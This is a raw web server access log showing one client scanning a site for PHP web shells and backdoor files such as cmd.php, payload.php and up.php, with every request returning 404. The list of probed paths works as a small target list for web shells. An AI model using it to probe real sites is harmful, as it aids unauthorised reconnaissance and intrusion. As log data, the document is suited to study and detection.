106.54.4.180 - - [16/Feb/2020:15:54:29 -0700] "GET /1x.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:30 -0700] "GET /home.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:32 -0700] "GET /undx.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:33 -0700] "GET /spider.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:36 -0700] "GET /composers.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:37 -0700] "GET /izom.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:40 -0700] "GET /hue2.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:41 -0700] "GET /Drupal.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:42 -0700] "GET /lang.php?f=1 HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:44 -0700] "GET /izom.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:45 -0700] "GET /payload.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:46 -0700] "GET /new_license.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:46 -0700] "GET /images/!.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:48 -0700] "GET /images/vuln.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:49 -0700] "GET /hd.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:50 -0700] "GET /images/up.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:50 -0700] "GET /images/attari.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:52 -0700] "GET /images/jsspwneed.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:53 -0700] "GET /images/stories/cmd.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:54 -0700] "GET /images/stories/filemga.php?ssp=RfVbHu HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
